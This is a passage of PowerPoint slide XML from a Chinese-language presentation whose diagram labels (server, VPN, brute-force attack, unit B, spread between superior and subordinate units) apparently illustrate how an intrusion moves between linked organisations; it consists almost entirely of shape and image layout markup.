              <a:chOff x="6755221" y="2904568"/>
              <a:chExt cx="1619367" cy="853849"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:pic>
            <p:nvPicPr>
              <p:cNvPr id="53" name="图片 52">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4A949779-6906-B24B-8F8F-CBBFA65E9310}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvPicPr>
                <a:picLocks noChangeAspect="1"/>
              </p:cNvPicPr>
              <p:nvPr/>
            </p:nvPicPr>
            <p:blipFill>
              <a:blip r:embed="rId5"/>
              <a:stretch>
                <a:fillRect/>
              </a:stretch>
            </p:blipFill>
            <p:spPr>
              <a:xfrm>
                <a:off x="7386016" y="2904568"/>
                <a:ext cx="466633" cy="537393"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:effectLst>
                <a:softEdge rad="112500"/>
              </a:effectLst>
            </p:spPr>
          </p:pic>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="49187" name="文本框 53"/>
              <p:cNvSpPr txBox="1">
                <a:spLocks noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="6755221" y="3416948"/>
                <a:ext cx="1619367" cy="34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1400" dirty="0"/>
                  <a:t>D</a:t>
                </a:r>
                <a:r>
                  <a:rPr lang="zh-CN" altLang="en-US" sz="1400" dirty="0"/>
                  <a:t>服务器</a:t>
                </a:r>
                <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1400" dirty="0"/>
              </a:p>
            </p:txBody>
          </p:sp>
        </p:grpSp>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="49162" name="组合 54"/>
            <p:cNvGrpSpPr>
              <a:grpSpLocks/>
            </p:cNvGrpSpPr>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr bwMode="auto">
            <a:xfrm>
              <a:off x="2063203" y="3888184"/>
              <a:ext cx="2600695" cy="554654"/>
              <a:chOff x="3335926" y="2904568"/>
              <a:chExt cx="3231634" cy="614489"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="56" name="燕尾形 55">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8F286D33-AEAF-4544-A6A7-84E941023A17}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="3335926" y="2985391"/>
                <a:ext cx="365246"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7" name="燕尾形 56">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{AFA4CBFC-F025-C54C-872A-C55879CB6455}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="3655120" y="2985391"/>
                <a:ext cx="363658"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8" name="燕尾形 57">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E2BC0CA5-4786-4640-98E8-5565A3FBBD7C}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="3972725" y="2985391"/>
                <a:ext cx="365246"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9" name="燕尾形 58">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4561CD47-00D6-534D-8B4A-92B64314AE73}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="4291918" y="2985391"/>
                <a:ext cx="363659"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0" name="燕尾形 59">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{201B4410-F80F-7F4A-8FF2-BD376D098E66}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="4609523" y="2985391"/>
                <a:ext cx="365246"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1" name="燕尾形 60">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{80B7BED6-A4A1-EF4E-86C8-DA76EB3A1AF6}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="4928717" y="2985391"/>
                <a:ext cx="365246"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2" name="燕尾形 61">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{75DB5F19-6ADD-144B-851E-F09247F76FD2}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="5247910" y="2985391"/>
                <a:ext cx="363659"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3" name="燕尾形 62">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D65FF67A-C2CD-2140-B092-252884A15A68}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="5565515" y="2985391"/>
                <a:ext cx="365246"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4" name="燕尾形 63">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{129336ED-BBD6-4245-BFE2-86F4D27CDD5D}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="5884709" y="2985391"/>
                <a:ext cx="363658"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5" name="燕尾形 64">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{0B8D8657-A84B-E54E-BC71-E8836481481A}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="6202314" y="2994900"/>
                <a:ext cx="365246" cy="356569"/>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6" name="矩形 65">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8D6C4C44-75BD-0842-9E1F-10ED51B785A0}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="4348544" y="2904568"/>
                <a:ext cx="1107937" cy="614489"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:noFill/>
            </p:spPr>
            <p:txBody>
              <a:bodyPr wrap="non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defRPr/>
                </a:pPr>
                <a:r>
                  <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0">
                    <a:effectLst>
                      <a:outerShdw blurRad="38100" dist="38100" dir="2700000" algn="tl">
                        <a:srgbClr val="C0C0C0"/>
                      </a:outerShdw>
                    </a:effectLst>
                    <a:latin typeface="微软雅黑" panose="020B0503020204020204" pitchFamily="34" charset="-122"/>
                  </a:rPr>
                  <a:t>VPN</a:t>
                </a:r>
                <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0">
                  <a:effectLst>
                    <a:outerShdw blurRad="38100" dist="38100" dir="2700000" algn="tl">
                      <a:srgbClr val="C0C0C0"/>
                    </a:outerShdw>
                  </a:effectLst>
                  <a:latin typeface="微软雅黑" panose="020B0503020204020204" pitchFamily="34" charset="-122"/>
                </a:endParaRPr>
              </a:p>
            </p:txBody>
          </p:sp>
        </p:grpSp>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="49163" name="组合 66"/>
            <p:cNvGrpSpPr>
              <a:grpSpLocks/>
            </p:cNvGrpSpPr>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr bwMode="auto">
            <a:xfrm>
              <a:off x="4444279" y="3894367"/>
              <a:ext cx="855711" cy="800567"/>
              <a:chOff x="6603241" y="2967722"/>
              <a:chExt cx="825925" cy="841454"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:cxnSp>
            <p:nvCxnSpPr>
              <p:cNvPr id="68" name="直接箭头连接符 71">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{0BD0EE1F-1D9A-EF4B-AD6D-71618F28C649}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvCxnSpPr>
                <a:stCxn id="65" idx="3"/>
                <a:endCxn id="53" idx="1"/>
              </p:cNvCxnSpPr>
              <p:nvPr/>
            </p:nvCxnSpPr>
            <p:spPr>
              <a:xfrm flipV="1">
                <a:off x="6815215" y="3162768"/>
                <a:ext cx="613951" cy="5329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9" name="图片 68">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{3A402D81-CADC-C447-8512-5F234C760595}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvPicPr>
                <a:picLocks noChangeAspect="1"/>
              </p:cNvPicPr>
              <p:nvPr/>
            </p:nvPicPr>
            <p:blipFill>
              <a:blip r:embed="rId4"/>
              <a:stretch>
                <a:fillRect/>
              </a:stretch>
            </p:blipFill>
            <p:spPr>
              <a:xfrm>
                <a:off x="6825753" y="2967722"/>
                <a:ext cx="254913" cy="340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9174" name="文本框 69"/>
              <p:cNvSpPr txBox="1">
                <a:spLocks noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="6603241" y="3259234"/>
                <a:ext cx="590788" cy="549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400" b="1">
                    <a:solidFill>
                      <a:srgbClr val="FF0000"/>
                    </a:solidFill>
                    <a:latin typeface="微软雅黑" panose="020B0503020204020204" pitchFamily="34" charset="-122"/>
                  </a:rPr>
                  <a:t>暴力破解</a:t>
                </a:r>
              </a:p>
            </p:txBody>
          </p:sp>
        </p:grpSp>
        <p:cxnSp>
          <p:nvCxnSpPr>
            <p:cNvPr id="71" name="曲线连接符 70">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{6C40CE94-C415-D448-8DB1-E11A87070667}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvCxnSpPr>
              <a:stCxn id="53" idx="0"/>
            </p:cNvCxnSpPr>
            <p:nvPr/>
          </p:nvCxnSpPr>
          <p:spPr>
            <a:xfrm rot="5400000" flipH="1" flipV="1">
              <a:off x="5620374" y="2884041"/>
              <a:ext cx="821324" cy="1086098"/>
            </a:xfrm>
            <a:prstGeom prst="curved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9165" name="图片 7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24604">
              <a:off x="5544783" y="3005407"/>
              <a:ext cx="1283106" cy="1078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6" name="图片 7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323913">
              <a:off x="5632280" y="3345956"/>
              <a:ext cx="1054235" cy="88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7" name="图片 7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191945">
              <a:off x="5678217" y="3625739"/>
              <a:ext cx="868278" cy="72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图片 74">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7CD7E1F5-77E7-CE48-B577-CE49616240C2}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvPicPr>
              <a:picLocks noChangeAspect="1"/>
            </p:cNvPicPr>
            <p:nvPr/>
          </p:nvPicPr>
          <p:blipFill>
            <a:blip r:embed="rId2"/>
            <a:stretch>
              <a:fillRect/>
            </a:stretch>
          </p:blipFill>
          <p:spPr>
            <a:xfrm rot="4011663">
              <a:off x="5589816" y="3839243"/>
              <a:ext cx="783883" cy="659434"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:ln>
              <a:noFill/>
            </a:ln>
            <a:effectLst>
              <a:outerShdw blurRad="292100" dist="139700" dir="2700000" algn="tl" rotWithShape="0">
                <a:srgbClr val="333333">
                  <a:alpha val="65000"/>
                </a:srgbClr>
              </a:outerShdw>
            </a:effectLst>
          </p:spPr>
        </p:pic>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="49169" name="图片 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flipH="1">
              <a:off x="5416799" y="4134775"/>
              <a:ext cx="1284537" cy="1112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70" name="图片 7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9909906" flipH="1">
              <a:off x="5566368" y="4027024"/>
              <a:ext cx="1187267" cy="1031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 name="矩形 77">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7A68E186-8471-4043-8536-1FB757A32468}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="6173188" y="1533201"/>
              <a:ext cx="1905472" cy="323165"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="squar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r>
                <a:rPr lang="zh-CN" altLang="en-US" sz="1500" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="0033CC"/>
                  </a:solidFill>
                  <a:effectLst>
                    <a:outerShdw blurRad="38100" dist="38100" dir="2700000" algn="tl">
                      <a:srgbClr val="C0C0C0"/>
                    </a:outerShdw>
                  </a:effectLst>
                  <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                  <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                </a:rPr>
                <a:t>单位</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="zh-CN" sz="1500" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="0033CC"/>
                  </a:solidFill>
                  <a:effectLst>
                    <a:outerShdw blurRad="38100" dist="38100" dir="2700000" algn="tl">
                      <a:srgbClr val="C0C0C0"/>
                    </a:outerShdw>
                  </a:effectLst>
                  <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                  <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                </a:rPr>
                <a:t>B</a:t>
              </a:r>
              <a:endParaRPr lang="zh-CN" altLang="en-US" sz="1500" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:effectLst>
                  <a:outerShdw blurRad="38100" dist="38100" dir="2700000" algn="tl">
                    <a:srgbClr val="C0C0C0"/>
                  </a:outerShdw>
                </a:effectLst>
                <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="15795124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8E1D1E-8411-1541-8E08-A52D2FCCA40C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="599294" y="80298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上下级单位扩散</a:t>
            </a:r>
            <a:endParaRPr sz="2800" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0033CC"/>
              </a:solidFill>
              <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="3" name="组合 2"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="717947" y="1500186"/>
            <a:ext cx="7406347" cy="4075365"/>
            <a:chOff x="717947" y="1500186"/>
            <a:chExt cx="7406347" cy="4075365"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="50178" name="组合 115"/>
            <p:cNvGrpSpPr>
              <a:grpSpLocks/>
            </p:cNvGrpSpPr>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr bwMode="auto">
            <a:xfrm>
              <a:off x="5697800" y="2094163"/>
              <a:ext cx="2426494" cy="3481388"/>
              <a:chOff x="8599903" y="1414600"/>
              <a:chExt cx="3235704" cy="4641632"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:pic>
            <p:nvPicPr>
              <p:cNvPr id="4" name="图片 3">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{853BD033-0825-CD4F-A135-8169EA9BAA75}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvPicPr>
                <a:picLocks noChangeAspect="1"/>
              </p:cNvPicPr>
              <p:nvPr/>
            </p:nvPicPr>
            <p:blipFill>
              <a:blip r:embed="rId2"/>
              <a:stretch>
                <a:fillRect/>
              </a:stretch>
            </p:blipFill>
            <p:spPr>
              <a:xfrm>
                <a:off x="8981304" y="1414600"/>
                <a:ext cx="466633" cy="537393"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:effectLst>
                <a:softEdge rad="112500"/>
              </a:effectLst>
            </p:spPr>
          </p:pic>
          <p:pic>
            <p:nvPicPr>
              <p:cNvPr id="5" name="图片 4">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C95EECD7-EA63-094A-ABD6-B0D168DDCAF1}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvPicPr>
                <a:picLocks noChangeAspect="1"/>
              </p:cNvPicPr>
              <p:nvPr/>
            </p:nvPicPr>
            <p:blipFill>
              <a:blip r:embed="rId2"/>
              <a:stretch>
                <a:fillRect/>
              </a:stretch>
            </p:blipFill>
            <p:spPr>
              <a:xfrm>
                <a:off x="9572319" y="1789537"/>
                <a:ext cx="466633" cy="537393"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:effectLst>
                <a:softEdge rad="112500"/>
              </a:effectLst>
            </p:spPr>
          </p:pic>
          <p:pic>
            <p:nvPicPr>
              <p:cNvPr id="6" name="图片 5">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C8AC979D-2670-A442-9161-A5D22E8ADF70}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvPicPr>
                <a:picLocks noChangeAspect="1"/>
              </p:cNvPicPr>
              <p:nvPr/>
            </p:nvPicPr>
            <p:blipFill>
              <a:blip r:embed="rId2"/>
              <a:stretch>
                <a:fillRect/>
              </a:stretch>
            </p:blipFill>
            <p:spPr>
              <a:xfrm>
                <a:off x="8602163" y="1982264"/>
                <a:ext cx="466633" cy="537393"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:effectLst>
                <a:softEdge rad="112500"/>
              </a:effectLst>
            </p:spPr>
          </p:pic>
          <p:pic>
            <p:nvPicPr>
              <p:cNvPr id="7" name="图片 6">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{BE15FBD7-789E-7944-9B3E-4A25EC6363A1}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvPicPr>
                <a:picLocks noChangeAspect="1"/>
              </p:cNvPicPr>
              <p:nvPr/>
            </p:nvPicPr>
            <p:blipFill>
              <a:blip r:embed="rId2"/>
              <a:stretch>
                <a:fillRect/>
              </a:stretch>
            </p:blipFill>
            <p:spPr>
              <a:xfrm>
                <a:off x="9225929" y="2691147"/>
                <a:ext cx="466633" cy="537393"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:effectLst>
                <a:softEdge rad="112500"/>
              </a:effectLst>
            </p:spPr>
          </p:pic>
          <p:pic>
            <p:nvPicPr>
              <p:cNvPr id="8" name="图片 7">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2F4B0C70-BEE2-CF43-B1B7-D5EF1F507BD6}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvPicPr>
                <a:picLocks noChangeAspect="1"/>
              </p:cNvPicPr>
              <p:nvPr/>
            </p:nvPicPr>
            <p:blipFill>
              <a:blip r:embed="rId2"/>
              <a:stretch>
                <a:fillRect/>
              </a:stretch>
            </p:blipFill>
            <p:spPr>
              <a:xfrm>
                <a:off x="10016245" y="2691147"/>
                <a:ext cx="466633" cy="537393"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:effectLst>
                <a:softEdge rad="112500"/>
              </a:effectLst>
            </p:spPr>
          </p:pic>
          <p:pic>
            <p:nvPicPr>
              <p:cNvPr id="9" name="图片 8">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2C7AFE73-CDD9-B04D-ACAA-3272D0AD0FF5}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvPicPr>
                <a:picLocks noChangeAspect="1"/>
              </p:cNvPicPr>
              <p:nvPr/>
            </p:nvPicPr>
            <p:blipFill>
              <a:blip r:embed="rId2"/>
              <a:stretch>
                <a:fillRect/>
              </a:stretch>
            </p:blipFill>
            <p:spPr>
              <a:xfrm>
                <a:off x="8992612" y="2250961"/>
                <a:ext cx="466633" cy="537393"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:effectLst>
                <a:softEdge rad="112500"/>
              </a:effectLst>
            </p:spPr>
          </p:pic>
          <p:pic>
            <p:nvPicPr>
              <p:cNvPr id="10" name="图片 9">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{238ECD63-C6C6-7E48-BF27-62112406932E}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvPicPr>
                <a:picLocks noChangeAspect="1"/>
              </p:cNvPicPr>
              <p:nvPr/>
            </p:nvPicPr>
            <p:blipFill>
              <a:blip r:embed="rId2"/>
              <a:stretch>
                <a:fillRect/>
              </a:stretch>
            </p:blipFill>
            <p:spPr>
              <a:xfrm>
                <a:off x="9583627" y="2625898"/>
                <a:ext cx="466633" cy="537393"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:effectLst>
                <a:softEdge rad="112500"/>
              </a:effectLst>
            </p:spPr>
          </p:pic>
          <p:pic>
            <p:nvPicPr>
              <p:cNvPr id="11" name="图片 10">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A4697E51-72F5-D841-917B-3D61F69E1D81}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvPicPr>
                <a:picLocks noChangeAspect="1"/>
              </p:cNvPicPr>
              <p:nvPr/>
            </p:nvPicPr>
            <p:blipFill>
              <a:blip r:embed="rId2"/>
              <a:stretch>
                <a:fillRect/>
              </a:stretch>
            </p:blipFill>
            <p:spPr>
              <a:xfrm>
                <a:off x="9237237" y="3527508"/>
                <a:ext cx="466633" cy="537393"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:effectLst>
                <a:softEdge rad="112500"/>
              </a:effectLst>
            </p:spPr>
          </p:pic>
          <p:pic>
            <p:nvPicPr>
              <p:cNvPr id="12" name="图片 11">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{765CBFC3-CAD3-DD4C-AF7E-BC6EF45BB79D}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvPicPr>
                <a:picLocks noChangeAspect="1"/>
              </p:cNvPicPr>
              <p:nvPr/>
            </p:nvPicPr>
            <p:blipFill>
              <a:blip r:embed="rId2"/>
              <a:stretch>
                <a:fillRect/>
              </a:stretch>
            </p:blipFill>
            <p:spPr>
              <a:xfrm>
                <a:off x="10027553" y="3527508"/>
                <a:ext cx="466633" cy="537393"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:effectLst>
                <a:softEdge rad="112500"/>
              </a:effectLst>
            </p:spPr>
          </p:pic>
          <p:pic>
            <p:nvPicPr>
              <p:cNvPr id="13" name="图片 12">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{68F95A9B-BA6C-0B48-B2EA-7D489EA779A2}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvPicPr>
                <a:picLocks noChangeAspect="1"/>
              </p:cNvPicPr>
              <p:nvPr/>
            </p:nvPicPr>
            <p:blipFill>
              <a:blip r:embed="rId2"/>
              <a:stretch>
                <a:fillRect/>
              </a:stretch>
            </p:blipFill>
            <p:spPr>
              <a:xfrm>
                <a:off x="8979044" y="3035301"/>
                <a:ext cx="466633" cy="537393"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:effectLst>
                <a:softEdge rad="112500"/>
              </a:effectLst>
            </p:spPr>
          </p:pic>
          <p:pic>
            <p:nvPicPr>
              <p:cNvPr id="14" name="图片 13">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E665E205-74D2-3649-ABF4-264BE322543E}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvPicPr>
                <a:picLocks noChangeAspect="1"/>
              </p:cNvPicPr>
              <p:nvPr/>
            </p:nvPicPr>
            <p:blipFill>
              <a:blip r:embed="rId2"/>
